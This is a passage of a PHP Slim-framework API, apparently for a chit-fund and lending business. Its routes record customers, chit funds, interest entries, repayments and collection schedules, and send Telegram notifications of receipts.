		$response["message"] = "Oops!,Didn't received the Customer value";
	}

	echoRespnse(200, $response);

});

//end
$app->post('/customer', function () use ($app) {

	$r = json_decode($app->request->getBody());
	verifyRequiredParams(array('FName'));
	$Customer = array();
	$Customer["FName"] = postParams($app->request->post('FName'));
	$Customer["LName"] = postParams($app->request->post('LName'));
	$Customer["Phone"] = postParams($app->request->post("Phone"));
	$Customer["Hami"] = postParams($app->request->post("Hami"));
	$Customer["IsHami"] = postParams($app->request->post("IsHami"));
	$Customer["chitfund"] = postParams($app->request->post("chitfund"));
	$Customer["aadhar"] = postParams($app->request->post("aadhar"));
	$Customer["passbook"] = postParams($app->request->post("passbook"));
	$Customer["debitcard"] = postParams($app->request->post("debitcard"));
	$Customer["cheque"] = postParams($app->request->post("cheque"));
	$Customer["pnote"] = postParams($app->request->post("pnote"));
	$Customer["greensheet"] = postParams($app->request->post("greensheet"));
	$Customer["note"] = postParams($app->request->post("note"));
	$Customer["forint"] = postParams($app->request->post("forint"));
	$Customer["intrate"] = postParams($app->request->post("intrate"));

	$db = new DbHandler();


	$getdata = array();
	$params = $db->getFunctionParam("customers");
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$customerList = call_user_func_array(array($db, 'getcustomers'), $getdata);
	$outputfields = array("id", "id", "firstname", "lastname", "phoneno", "hami", "ishami", "chitfund", "hamifirstname", "hamilastname", "hamiphoneno", "aadhar", "passbook", "debitcard", "cheque", "pnote", "greensheet", "note", "forint", "intrate", "created", "updated");
	$qryfields = array("id", "SNO", "Firstname", "LastName", "PhoneNo", "hami", "ishami", "chitfund", "HamiFirstName", "HamiLastName", "HamiPhoneNo", "aadhar", "passbook", "debitcard", "cheque", "pnote", "greensheet", "note", "forint", "intrate", "Created", "Updated");
	$oldcustomer = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($customerList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($customerList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $customerList[$i][$outputfields[$j]];
			}
		}
		array_push($oldcustomer, $tmp);

	}

	for ($i = 0; $i < sizeof($oldcustomer); $i++) {
		// echo json_encode($i);
		if ($oldcustomer[$i]["Firstname"] == $Customer["FName"] && $oldcustomer[$i]["LastName"] == $Customer["LName"]) {
			$response["error"] = false;
			$response["status"] = "failed";
			$response["samecus"] = 1;
			$response["message"] = "Oops! Already Customer with same name exist";

			echoRespnse(200, $response);
			return;
		}
	}
	// echo "hiiidone";
	$createCustomerstatus = $db->createCustomer($Customer);
	$id = $createCustomerstatus['id'];
	if ($Customer["Hami"] == 0 && $Customer["IsHami"] == 1) {

		$params = $db->putFunctionParam("customers");
		$updateField = array();
		$updateField["id"] = $id;


		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "hami") {
				array_push($putdata, $id);
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");

		//echo json_encode($putdata);
		$editDetail = call_user_func_array(array($db, 'editcustomer'), $putdata);
	}
	if ($createCustomerstatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating firm";
		$response["err"] = $createCustomerstatus;
	} else {

		$response["error"] = false;
		$response["status"] = "success";
		$response["samecus"] = 0;
		$response["id"] = $createCustomerstatus['id'];
		$response["message"] = "Woot!,Successfully created Customer with id " . $createCustomerstatus['id'];
	}

	echoRespnse(200, $response);
});

$app->post('/chitfund', function () use ($app) {

	$r = json_decode($app->request->getBody());
	$chitfund = array();
	$chitfund["customer"] = postParams($app->request->post('customer'));
	$chitfund["date"] = postParams($app->request->post('date'));
	$chitfund["amount"] = postParams($app->request->post("amount"));
	$chitfund["type"] = postParams($app->request->post("type"));
	$chitfund["status"] = postParams($app->request->post("status"));

	$db = new DbHandler();

	$createchitfundstatus = $db->createchitfund($chitfund);

	if ($createchitfundstatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating Chit fund";
		$response["err"] = $createchitfundstatus;
	} else {

		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $createchitfundstatus['id'];
		$response["message"] = "Woot!,Successfully created Chit Fund with id " . $createchitfundstatus['id'];
	}

	echoRespnse(200, $response);
});


$app->post('/interest', function () use ($app) {

	$r = json_decode($app->request->getBody());
	$interest = array();
	$interest["date"] = postParams($app->request->post('date'));
	$interest["customer"] = postParams($app->request->post('customer'));
	$interest["credit"] = postParams($app->request->post("credit"));
	$interest["debit"] = postParams($app->request->post("debit"));
	$interest["note"] = postParams($app->request->post("note"));
	$interest["note1"] = postParams($app->request->post("note1"));
	$interest["paymentmode"] = 0;
	$interestrows = postParams($app->request->post("intArr"));

	$db = new DbHandler();

	$tmpno = 0;
	for ($i = 0; $i < sizeof($interestrows); $i++) {
		$tmpno += $interestrows[$i]["intamount"];
	}
	if ($tmpno == $interest["credit"]) {
		$createInterestStatus = $db->createInterest($interest);

		if ($createInterestStatus['status'] == SUCCESS) {

			if (sizeof($interestrows) > 0) {
				$createInterestRowStatus = $db->createInterestRows($createInterestStatus['id'], $interestrows);
			}

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $createInterestStatus['id'];
			$response["message"] = "Woot!,Successfully created Interest Entries";

		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while creating Interest Entries";
			$response["err"] = $createInterestStatus;
		}

	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! Interest total is wrong";

		echoRespnse(200, $response);
		return;
	}




	echoRespnse(200, $response);
});


$app->get('/interest', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("interest");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$interestList = call_user_func_array(array($db, 'getInterest'), $getdata);
	// echo json_encode($interestList[0]["id"]);
	// echo json_encode($interestList);
	// echo sizeof($interestList);
	// echo ($interestList[0]["id"] != null);
	if (sizeof($interestList) > 0 && $interestList[0]["id"] != null) {
		$outputfields = array("id", "date", "customer", "customername", "credit", "credittotal", "debit", "debittotal", "note", "note1", "created", "updated");
		$qryfields = array("id", "date", "customer", "customername", "credit", "credittotal", "debit", "debittotal", "note", "note1", "created", "updated");
		$interest = array();
		// looping through result and preparing tasks array
		for ($i = 0; $i < sizeOf($interestList); $i++) {
			$tmp = array();
			for ($j = 0; $j < sizeof($qryfields); $j++) {
				if (isset($interestList[$i][$outputfields[$j]])) {
					$tmp[$qryfields[$j]] = $interestList[$i][$outputfields[$j]];
				}
			}
			array_push($interest, $tmp);

		}
		// echo sizeof($interest);
		if (sizeof($interest) > 0) {
			for ($m = 0; $m < sizeof($interest); $m++) {
				$interest[$m]["introws"] = array();
				$getIntRowsdata = array();
				$params = $db->getFunctionParam("interestrows");
				for ($j = 0; $j < sizeof($params); $j++) {
					if ($params[$j] == "intid") {
						array_push($getIntRowsdata, $interest[$m]["id"]);
					} else {
						array_push($getIntRowsdata, "");
					}
				}
				array_push($getIntRowsdata, "");

				$intRowsList = call_user_func_array(array($db, "getInterestRows"), $getIntRowsdata);
				$tmp = array();
				for ($h = 0; $h < sizeof($intRowsList); $h++) {
					if ($intRowsList[$h]["intid"] == $interest[$m]["id"]) {
						array_push($tmp, $intRowsList[$h]);
					}
				}

				$interest[$m]["introws"] = $tmp;
			}
		}

		$response["error"] = false;
		// $getdata[sizeof($getdata)-3]="";
		// $getdata[sizeof($getdata)-2]="";
		// $getdata[sizeof($getdata)-1]=1;
		$response['status'] = "success";
		//$response['total'] = call_user_func_array(array($db,'getinterest'), $getdata)[0]["count(*)"];

		$response["interest"] = $interest;
		$response["message"] = "Woot!,Successfully retreived the Interest list";
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Interest entries found";
	}



	echoRespnse(200, $response);

});


$app->get('/interestcal', function () use ($app) {

	$fromdate = getParams($app->request->get("fromdate"));
	$todate = getParams($app->request->get("todate"));
	$customer = getParams($app->request->get("customer"));
	$intrate = getParams($app->request->get("intrate"));
	$totalint = 0;

	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("drcr");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "forint") {
			array_push($getdata, 1);
		} else if ($params[$i] == "date") {
			$tmp = array();
			$tmp["op"] = "Between";
			$tmp["value"] = $fromdate;
			$tmp["value1"] = $todate;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$i] == "customer") {
			array_push($getdata, $customer);
			// }else if($params[$a] == "fields"){
			// 	array_push($getdata,"sum(credit) as credittotal,sum(debit) as debittotal");
		} else {
			array_push($getdata, "");
		}
	}
	$drcrList = call_user_func_array(array($db, 'getdrcr'), $getdata);
	if ($drcrList && sizeof($drcrList)) {
		$ttlamount = 0;
		for ($j = 0; $j < sizeof($drcrList); $j++) {

			//first finding opbal
			if ($drcrList[$j]["credit"] > 0) {
				$ttlamount += $drcrList[$j]["credit"];
			} else {
				$ttlamount -= $drcrList[$j]["debit"];
			}

			//finding diff between two dates
			$tempfdate = $drcrList[$j]["date"];
			// if($j != sizeof($drcrList) - 1 ){
			if ($j != sizeof($drcrList) - 1) {
				$temptdate = $drcrList[$j + 1]["date"];
				$drcrList[$j + 1]["datediff"] = (strtotime($temptdate) - strtotime($tempfdate)) / (60 * 60 * 24);
			} else {
				$temptdate = date("Y-m-d");
			}
			diffmonths($tempfdate, $temptdate);
			//start diff
			$daysdiff = 0;
			$daysinamonth = 0;

			$tempfdate = explode("-", $tempfdate);
			$fromyear = $tempfdate[0];
			$frommonth = $tempfdate[1];
			$fromday = $tempfdate[2];

			$temptdate = explode("-", $temptdate);
			$tomonth = $temptdate[1];
			$toyear = $temptdate[0];
			$today = $temptdate[2];

			if ($frommonth == $tomonth && $fromyear == $toyear) {
				$daysdiff = $today - $fromday;
				$daysinamonth = cal_days_in_month(CAL_GREGORIAN, $frommonth, $fromyear);
				$int = $ttlamount * $intrate / 100;
				$int = $int / $daysinamonth;
				$totalint += $int * $daysdiff;
				echo $totalint . "stop";
				// echo "dys".$daysinamonth;
				// echo "(".$today. "-" .$fromday. ")"."intdiff->".$daysdiff . "stop";
				// echo $frommonth.$fromyear.$tomonth.$toyear."(same month) stop";
			} else {

				// echo $frommonth.$fromyear.$tomonth.$toyear."(diff month) stop";
			}



			//end diff
			// $drcrList[$j]["datediff"]  = (strtotime($temptdate) - strtotime($tempfdate)) / (60 * 60 * 24);


			// echo json_encode($drcrList);

		}

	}


	// $params= $db->getFunctionParam("interest");
	// $getdata = array();
	// for($i=0;$i<sizeof($params);$i++){
	// 	if($params[$i]=="id"){
	// 		array_push($getdata,$id);
	// 	}else{
	// 		array_push($getdata,"");
	// 	}
	// }

});


$app->post('/payinterest', function () use ($app) {
	$r = json_decode($app->request->getBody());
	verifyRequiredParams(array('date', 'customer', 'debit'));
	$interest = array();
	$interest["date"] = postParams($app->request->post('date'));
	$interest["customer"] = postParams($app->request->post('customer'));
	$interest["credit"] = postParams($app->request->post("credit"));
	$interest["debit"] = postParams($app->request->post("debit"));
	$interest["paymentmode"] = postParams($app->request->post("paymentmode"));
	$interest["pmtrans"] = postParams($app->request->post("pmtrans"));
	$interest["note"] = postParams($app->request->post("note"));
	$interest["note1"] = postParams($app->request->post("note1"));

	$db = new DbHandler();


	$createInterestStatus = $db->createInterest($interest);

	if ($createInterestStatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while create interest entry";
		$response["err"] = $createInterestStatus;
	} else {
		if ($interest["paymentmode"] == 50 && sizeof($interest["pmtrans"])) {
			$pmid = array();
			for ($k = 0; $k < sizeof($interest["pmtrans"]); $k++) {
				if ($interest["pmtrans"][$k]["paymentmode"]) {
					$pmtrans = array();
					$pmtrans["date"] = $interest["date"];
					$pmtrans["tablename"] = "interest";
					$pmtrans["tableid"] = $createInterestStatus['id'];
					$pmtrans["paymentmode"] = $interest["pmtrans"][$k]["paymentmode"];
					$pmtrans["credit"] = $interest["pmtrans"][$k]["credit"];
					$pmtrans["debit"] = $interest["pmtrans"][$k]["debit"];
					$createpmtransstatus = $db->createPmTrans($pmtrans);
					array_push($pmid, $createpmtransstatus['id']);
					// echo "pmtrans_status".json_encode($createInterestStatus);
				}
			}
			if ($pmid && sizeof($pmid) > 0) {
				$params = $db->putFunctionParam("interest");
				$updateField = array();
				$updateField["id"] = $createInterestStatus['id'];
				$putdata = array();
				array_push($putdata, $updateField);
				for ($i = 0; $i < sizeof($params); $i++) {
					if ($params[$i] == "pmid") {
						array_push($putdata, implode(',', $pmid));
					} else {
						array_push($putdata, "");
					}
				}
				array_push($putdata, "");
				// echo " 3- ".json_encode($putdata);
				$editDetail = call_user_func_array(array($db, 'editInterest'), $putdata);
			}
		}

		$response["error"] = false;
		$response["status"] = "success";
		$response["samecus"] = 0;
		$response["id"] = $createInterestStatus['id'];
		$response["message"] = "Woot!,Successfully created Interest Payment entry with id " . $createInterestStatus['id'];
	}

	echoRespnse(200, $response);

});



$app->post('/without', function () use ($app) {

	$r = json_decode($app->request->getBody());
	$without = array();
	$without["customer"] = postParams($app->request->post('customer'));
	$without["date"] = postParams($app->request->post('date'));
	$without["amount"] = postParams($app->request->post("amount"));
	$without["note"] = postParams($app->request->post("note"));

	// echo json_encode($without);

	$db = new DbHandler();

	$createwithoutstatus = $db->createwithout($without);
	if ($createwithoutstatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating firm";
		$response["err"] = $createwithoutstatus;
	} else {

		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $createwithoutstatus['id'];
		$response["message"] = "Woot!,Successfully created Without entry with id " . $createwithoutstatus['id'];
	}

	echoRespnse(200, $response);
});



$app->post('/chiti', function () use ($app) {
	$q = json_decode($app->request->getBody());

	$chiti = array();
	$chiti["customer"] = postParams($app->request->post("customer"));
	$chiti["code"] = postParams($app->request->post("code"));
	$chiti["dAte"] = postParams($app->request->post("dAte"));
	$chiti["tYpe"] = postParams($app->request->post("tYpe"));
	$chiti["iscountable"] = postParams($app->request->post("iscountable"));
	$chiti["aMount"] = postParams($app->request->post("aMount"));
	$chiti["paymentmode"] = postParams($app->request->post("paymentmode"));
	$chiti["pmid"] = "";
	$chiti["pmtrans"] = postParams($app->request->post("pmtrans"));

	$chiti["pdwtm"] = postParams($app->request->post("pdwtm"));
	$chiti["interestrate"] = postParams($app->request->post("interestrate"));
	$chiti["ccomm"] = postParams($app->request->post("ccomm"));
	$chiti["ccommpaymentmode"] = postParams($app->request->post("ccommpaymentmode"));
	$chiti["suriccomm"] = postParams($app->request->post("suriccomm"));
	$chiti["sowji"] = 0;
	$chiti["suri"] = postParams($app->request->post("suri"));
	$chiti["fullandevi"] = 0;
	$chiti["reverse"] = 0;
	$chiti["revcash"] = 0;
	$chiti["status"] = postParams($app->request->post("status"));
	$chiti["days"] = postParams($app->request->post("days"));
	$chiti["note"] = postParams($app->request->post("note"));
	$chiti["irregular"] = 0;
	$chiti["advintmonths"] = postParams($app->request->post("advintmonths"));
	$chiti["advintpaymentmode"] = postParams($app->request->post("advintpaymentmode"));

	$db = new DbHandler();

	$createchitistatus = $db->createchiti($chiti);
	if ($createchitistatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating Chiti";
		$response["err"] = $createchitistatus;
	} else {
		$collection = array();
		$days = 1;
		$diff = 1;
		$date = $chiti["dAte"];
		if ($chiti["tYpe"] == 1) {
			$days = 90;
			$diff = 1;
		} else if ($chiti["tYpe"] == 2) {
			$days = 13;
			$diff = 7;
		} else if ($chiti["tYpe"] == 3) {
			$days = 9;
			$diff = 10;
		} else if ($chiti["tYpe"] == 4) {
			$days = 5;
			$diff = 1;
		}
		if ($chiti["days"] > 0) {
			$days = $chiti["days"];
		}

		for ($i = 0; $i < $days; $i++) {
			$temp = array();

			$temp["reverseid"] = 0;
			$temp["chiti"] = $createchitistatus['id'];
			$temp["amount"] = $chiti["pdwtm"];
			$temp["sowji"] = $chiti["sowji"];
			$temp["suri"] = $chiti["suri"];
			$temp["fullandevi"] = $chiti["fullandevi"];
			$temp["notes"] = "";
			if ($chiti["tYpe"] == 4 || $chiti["tYpe"] == 5) {
				$date = date('Y-m-d', strtotime($date . ' + ' . $diff . ' months'));
			} else {
				$date = date('Y-m-d', strtotime($date . ' + ' . $diff . ' days'));
			}
			$temp["date"] = $date;

			if ($chiti["advintmonths"] > 0 && $i < $chiti["advintmonths"]) {
				$temp["received"] = 1;
				$temp["receivedfrom"] = $chiti["customer"];
				$temp["rcvddate"] = $chiti["dAte"];
				$temp["notes"] = "deducted";

			} else {
				$temp["received"] = 0;
				$temp["receivedfrom"] = 0;
				$temp["rcvddate"] = "";
			}

			// $temp["paiddays"] =	
			array_push($collection, $temp);

		}

		$createcollectionstatus = $db->createcollection($collection);

		// echo "collid->".json_encode($createcollectionstatus);
		// echo "chiti->".json_encode($chiti);
		if ($chiti["paymentmode"] == "50" && sizeof($chiti["pmtrans"]) > 0) {
			$pmamt = 0;

			$pmid = array();
			for ($p = 0; $p < sizeof($chiti["pmtrans"]); $p++) {
				if ($chiti["pmtrans"][$p]["paymentmode"]) {
					$pmtrans = array();
					$pmtrans["date"] = $chiti["dAte"];
					$pmtrans["tablename"] = "chiti";
					$pmtrans["tableid"] = $createchitistatus['id'];
					$pmtrans["paymentmode"] = $chiti["pmtrans"][$p]["paymentmode"];
					$pmtrans["credit"] = 0;
					$pmtrans["debit"] = $chiti["pmtrans"][$p]["debit"];
					$createpmtransstatus = $db->createPmTrans($pmtrans);
					array_push($pmid, $createpmtransstatus['id']);
					// echo "pmtrans_status".json_encode($createreceivedstatus);

					//st					
					if ($pmid && sizeof($pmid) > 0) {
						$params = $db->putFunctionParam("chiti");
						$updateField = array();
						$updateField["id"] = $createchitistatus['id'];
						$putdata = array();
						array_push($putdata, $updateField);
						for ($i = 0; $i < sizeof($params); $i++) {
							if ($params[$i] == "pmid") {
								array_push($putdata, implode(',', $pmid));
							} else {
								array_push($putdata, "");
							}
						}
						array_push($putdata, "");
						// echo " 3- ".json_encode($putdata);
						$editDetail = call_user_func_array(array($db, 'editchiti'), $putdata);
					}
					//end


				}
			}
		}


		// get collection entries of this chiti and make recieved entries
		if ($chiti["advintmonths"] > 0) {
			$params = $db->getFunctionParam("collection");
			$getdata = array();
			for ($i = 0; $i < sizeof($params); $i++) {
				if ($params[$i] == "chiti") {
					array_push($getdata, $createchitistatus['id']);
				} else if ($params[$i] == "sort_by") {
					array_push($getdata, "a.date");
				} else if ($params[$i] == "sort_order") {
					array_push($getdata, "asc");
				} else {
					array_push($getdata, "");
				}
			}

			$collectionList = call_user_func_array(array($db, 'getcollection'), $getdata);
			// echo "collectionList".json_encode($collectionList);
			if (sizeof($collectionList) > 0) {
				for ($m = 0; $m < sizeof($collectionList); $m++) {
					if ($collectionList[$m]["received"] == 1) {
						$received = array();

						$received["customer"] = $chiti["customer"];
						$received["amount"] = $collectionList[$m]["amount"];
						$received["rcvddate"] = $chiti["dAte"];
						$received["paymentmode"] = $chiti["advintpaymentmode"];
						$received["pmid"] = "";
						$received["asalu"] = 0;
						$received["asaluid"] = 0;
						$received["chiti"] = $createchitistatus['id'];
						$received["note"] = "deducted";
						$colid = $collectionList[$m]["id"];

						$createreceivedstatus = $db->createreceived($colid, $received);
						// echo "createreceivedstatus".json_encode($createreceivedstatus);
					}
				}

				// if($createreceivedstatus["status"] == SUCCESS){
				// 	if($received["paymentmode"] == "50" && sizeof($chiti["advintpmtrans"])>0 ){
				// 		$pmamt = 0;

				// 		for($k=0;$k<sizeof($chiti["advintpmtrans"]);$k++){
				// 			if($chiti["advintpmtrans"][$k]["paymentmode"]){
				// 				$pmtrans = array();
				// 				$pmtrans["tableid"] = "received-".$createreceivedstatus['id'];
				// 				$pmtrans["paymentmode"] = $chiti["advintpmtrans"][$k]["paymentmode"];
				// 				$pmtrans["amount"] = $chiti["advintpmtrans"][$k]["amount"];
				// 				$createpmtransstatus = $db-> createPmTrans($pmtrans);
				// 				// echo "pmtrans_status".json_encode($createreceivedstatus);
				// 			}
				// 		}
				// 	}
				// }
			}
		}


		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $createchitistatus['id'];
		$response["message"] = "Woot!,Successfully created chiti and added entries for id " . $createchitistatus['id'];

	}

	echoRespnse(200, $response);
});


$app->post('/asaludemo', function () use ($app) {
	$q = json_decode($app->request->getBody());
	$asalu = array();
	$asalu["date"] = postParams($app->request->post("date"));
	$asalu["customer"] = postParams($app->request->post("customer"));
	$asalu["amount"] = postParams($app->request->post("amount"));
	$asalu["chitiamount"] = postParams($app->request->post("chitiamount"));
	$asalu["chiti"] = postParams($app->request->post("chiti"));
	$asalu["paymentmode"] = postParams($app->request->post("paymentmode"));
	$asalu["pmtrans"] = postParams($app->request->post("pmtrans"));
	$asalu["note"] = postParams($app->request->post("note"));
	// $asalu["customername"] = postParams($app->request->post("customername"));
	$db = new DbHandler();

	// echo $asalu["customername"];
	// echo json_encode($q);

	// $list = array (
	// 	array("Peter", "Griffin" ,"Oslo", "Norway"),
	// 	array("Glenn", "Quagmire", "Oslo", "Norway")
	// );

	$file = fopen("contacts.csv", "w");


	$fieldsHeading = array(
		"date",
		"customer",
		"amount",
		"chitiamount",
		"chiti",
		"paymentmode",
		"pmtrans",
		"note",
	);
	fputcsv($file, $fieldsHeading);


	$fields = array(
		"date",
		"customer",
		"amount",
		"chitiamount",
		"chiti",
		"paymentmode",
		"pmtrans",
		"note",
	);


	// $q = json_decode(json_encode($q), True);
	$temp = array();
	for ($i = 0; $i < sizeof($fields); $i++) {
		array_push($temp, $asalu[$fields[$i]]);
	}
	fputcsv($file, $temp);
	// each ($asalu as $param -> $line) {
	// 	fputcsv($file, $param,$line);
	// }

	fclose($file);
});



$app->post('/asalu', function () use ($app) {
	$q = json_decode($app->request->getBody());
	// echo json_encode($q);
	$asalu = array();
	$asalu["date"] = postParams($app->request->post("date"));
	$asalu["customer"] = postParams($app->request->post("customer"));
	$asalu["customername"] = postParams($app->request->post("customername"));
	$asalu["amount"] = postParams($app->request->post("amount"));
	$asalu["chitiamount"] = postParams($app->request->post("chitiamount"));
	$asalu["chiti"] = postParams($app->request->post("chiti"));
	$asalu["paymentmode"] = postParams($app->request->post("paymentmode"));
	$asalu["pmtrans"] = postParams($app->request->post("pmtrans"));
	$asalu["collectedby"] = postParams($app->request->post("collectedby"));
	$asalu["note"] = postParams($app->request->post("note"));
	$db = new DbHandler();

    if (gettype($asalu["pmtrans"]) == "string") {
        $asalu["pmtrans"] = json_decode($asalu["pmtrans"], true);
	}
	$paymentmodeList = $db->getdynamicRecord("select * FROM paymentmodes ", 100);
	// echo json_encode($paymentmodeList);
	$createasalustatus = $db->createasalu($asalu);
	if ($createasalustatus['status'] == 0) {
		$fullmsg = $asalu["date"] . " - " . $asalu["customername"] . "(" . $asalu["chiti"] . ")" . " gave " . $asalu["amount"] . "(" . $asalu["note"] . ")" . " in ";
		$mainmsg = $asalu["customername"] . "(" . $asalu["chiti"] . ")" . " - " . $asalu["amount"] . "(" . $asalu["note"] . ")";
		$teleStatus = sendTelegram($fullmsg, "main");
		$received = array();

		$received["customer"] = $asalu["customer"];
		$received["amount"] = $asalu["amount"];
		$received["rcvddate"] = $asalu["date"];
		$received["asalu"] = 1;
		$received["asaluid"] = $createasalustatus['id'];
		$received["chiti"] = $asalu["chiti"];
		$received["paymentmode"] = $asalu["paymentmode"];
		$received["pmid"] = "";
		$received["pmtrans"] = $asalu["pmtrans"];
		$received["collectedby"] = $asalu["collectedby"];
		$received["note"] = $asalu["note"];
		$db = new DbHandler();

		$createreceivedstatus = $db->createreceived(0, $received);

		if ($createreceivedstatus["status"] == 0) {
			// $fullmsg = ""
			// sendTelegram("")
			if ($received["paymentmode"] == 50 && sizeof($received["pmtrans"])) {
				$pmid = array();
				for ($k = 0; $k < sizeof($received["pmtrans"]); $k++) {
					if ($received["pmtrans"][$k]["paymentmode"]) {
						$pmtrans = array();
						$pmtrans["date"] = $received["rcvddate"];
						$pmtrans["tablename"] = "received";
						$pmtrans["tableid"] = $createreceivedstatus['id'];
						$pmtrans["paymentmode"] = $received["pmtrans"][$k]["paymentmode"];
						$pmtrans["credit"] = $received["pmtrans"][$k]["credit"];
						$pmtrans["debit"] = $received["pmtrans"][$k]["debit"];
						$createpmtransstatus = $db->createPmTrans($pmtrans);
						$fullmsg .= "[" . getpmname($pmtrans["paymentmode"], $paymentmodeList) . ":" . $pmtrans["credit"] . "]";
						array_push($pmid, $createpmtransstatus['id']);
					}
				}
				if ($pmid && sizeof($pmid) > 0) {
					$params = $db->putFunctionParam("received");
					$updateField = array();
					$updateField["id"] = $createreceivedstatus['id'];
					$putdata = array();
					array_push($putdata, $updateField);
					for ($q = 0; $q < sizeof($params); $q++) {
						if ($params[$q] == "pmid") {
							array_push($putdata, implode(',', $pmid));
						} else {
							array_push($putdata, "");
						}
					}
					array_push($putdata, "");
					$editDetail = call_user_func_array(array($db, 'editreceived'), $putdata);
				}
			} else {
				$fullmsg .= getpmname($received["paymentmode"], $paymentmodeList);
				if ($received["paymentmode"] > 1) {
					$mainmsg .= "(" . getpmname($received["paymentmode"], $paymentmodeList) . ")";
				}
			}



		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while creating rcvd entry";
			$response["err"] = $createreceivedstatus;
		}

		$teleStatus = sendTelegram(urlencode($fullmsg), "full");
		$teleStatus = sendTelegram(urlencode($mainmsg), "main");
		if($asalu["chiti"] == 696){
	        $teleStatus = sendTelegram(urlencode($fullmsg), "sanju");
		}
		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $createasalustatus['id'];
		$response["message"] = "Woot!,Successfully added asalu with id " . $createasalustatus['id'];
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while adding Asalu";
		$response["err"] = $createasalustatus;
		$teleStatus = sendTelegram("Oops! An error occurred while adding Asalu", "main");

	}

	echoRespnse(200, $response);

});



$app->post('/collection', function () use ($app) {
	$q = json_decode($app->request->getBody());

	$coll = array();
	$coll["noof"] = postParams($app->request->post("noof"));
	$coll["customer"] = postParams($app->request->post("customer"));
	$coll["dAte"] = postParams($app->request->post("dAte"));
	$coll["chiti"] = postParams($app->request->post("chiti"));
	$coll["pdwtm"] = postParams($app->request->post("pdwtm"));
	$coll["notes"] = postParams($app->request->post("notes"));
	$coll["sowji"] = postParams($app->request->post("sowji"));
	$coll["suri"] = postParams($app->request->post("suri"));
	$coll["fullandevi"] = postParams($app->request->post("fullandevi"));
	$db = new DbHandler();


	$collection = array();
	$date = $coll["dAte"];
	$days = $coll["noof"];
	$diff = 1;


	for ($i = 0; $i < $days; $i++) {
		$temp = array();
		$temp["received"] = 0;
		$temp["receivedfrom"] = 0;
		$temp["reverseid"] = 0;
		$temp["rcvddate"] = "";
		$temp["chiti"] = $coll["chiti"];
		$temp["amount"] = $coll["pdwtm"];
		$temp["notes"] = $coll["notes"];
		$temp["sowji"] = $coll["sowji"];
		$temp["suri"] = $coll["suri"];
		$temp["fullandevi"] = $coll["fullandevi"];
		$date = date('Y-m-d', strtotime($date . ' + ' . $diff . ' months'));
		$temp["date"] = $date;

		$temp["paiddays"] = array_push($collection, $temp);

	}
	//echo json_encode($collection);
	$createcollectionstatus = $db->createcollection($collection);

	$response["error"] = false;
	$response["status"] = "success";
	$response["id"] = $coll["chiti"];
	$response["message"] = "Woot!,Successfully created Collection entries for id " . $coll["chiti"];





	echoRespnse(200, $response);
});




$app->post('/dailyCollection', function () use ($app) {
	$q = json_decode($app->request->getBody());
	$asalu = postParams($app->request->post("asalu"));
	// $collectionids = postParams($app->request->post('cid'));
	// $coll = array();
	// $coll["noof"] = postParams($app->request->post("noof"));
	// $coll["customer"] = postParams($app->request->post("customer"));
	// $coll["dAte"] = postParams($app->request->post("dAte"));
	// $coll["chiti"] = postParams($app->request->post("chiti"));
	// $coll["pdwtm"] = postParams($app->request->post("pdwtm"));
	// $coll["sowji"] = postParams($app->request->post("sowji"));
	// for($i;$i<sizeof($asalu);$i++){

	// }
	$db = new DbHandler();
	$asaluid = array();
	$paymentmodeList = $db->getdynamicRecord("select * FROM paymentmodes where deleted = 0", 100);
	$msg = "";
	for ($i = 0; $i < sizeof($asalu); $i++) {
		// $asaluData = $asalu[$i];
		// echo $msg . "      ";
		($i > 0) ? $msg .= "\n" : "";
		// echo $msg;
		$isAsaluid = 0;
		$createDailyasaluStatus = $db->createasalu($asalu[$i]);
		if (sizeof($asaluid) > 0) {
			for ($j = 0; $j < sizeof($asaluid); $j++) {
				if ($asaluid[$j] == $asalu[$i]["chiti"]) {
					$isAsaluid += 1;
				}
			}

			if ($isAsaluid == 0) {
				array_push($asaluid, $asalu[$i]["chiti"]);
			}
		} else {
			array_push($asaluid, $asalu[$i]["chiti"]);
		}
		

		if ($createDailyasaluStatus["status"] == SUCCESS) {
			$msg .= $asalu[$i]["customername"] . "(" . $asalu[$i]["chiti"] . ") - " . $asalu[$i]["amount"] . "(" . $asalu[$i]["note"] . ")";
			$received = array();
